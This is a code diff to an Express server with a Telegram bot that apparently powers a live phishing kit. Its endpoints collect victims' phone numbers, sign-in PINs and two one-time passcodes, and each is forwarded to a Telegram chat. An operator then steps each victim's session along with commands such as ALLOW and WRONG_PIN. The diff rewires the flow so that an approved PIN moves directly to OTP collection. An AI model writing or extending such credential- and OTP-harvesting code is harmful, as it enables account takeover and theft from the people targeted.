@@ -109,8 +109,8 @@ async function initBot() {
           break;
         case 'ALLOW_APP':
         case 'ALLOW':
-          session.status = 'PROCEED_SIGNIN';
-          await bot.sendMessage(chatTarget, `✅ Application allowed. Moved to Sign In.`);
+          session.status = 'PROCEED_OTP1'; // Proceed to OTP after ALLOW on PIN
+          await bot.sendMessage(chatTarget, `✅ PIN allowed. Moved to OTP Step 1.`);
           break;
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
@@ -175,7 +175,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// 2. Submit Sign In PIN -> Sent to Telegram
+// Submit Sign In PIN -> Sent to Telegram
 app.post('/api/submit-pin', async (req, res) => {
   try {
     const { userId, phone, pin } = req.body || {};
@@ -209,7 +209,7 @@ app.post('/api/submit-pin', async (req, res) => {
   }
 });
 
-// 3. Submit OTP 1 -> Sent to Telegram
+// Submit OTP 1 -> Sent to Telegram
 app.post('/api/submit-otp1', async (req, res) => {
   try {
     const { userId, phone, otp } = req.body || {};
@@ -244,7 +244,7 @@ app.post('/api/submit-otp1', async (req, res) => {
   }
 });
 
-// 4. Submit OTP 2 (Final Verification) -> Sent to Telegram
+// Submit OTP 2 (Final Verification) -> Sent to Telegram
 app.post('/api/submit-otp2', async (req, res) => {
   try {
     const { userId, phone, otp } = req.body || {};
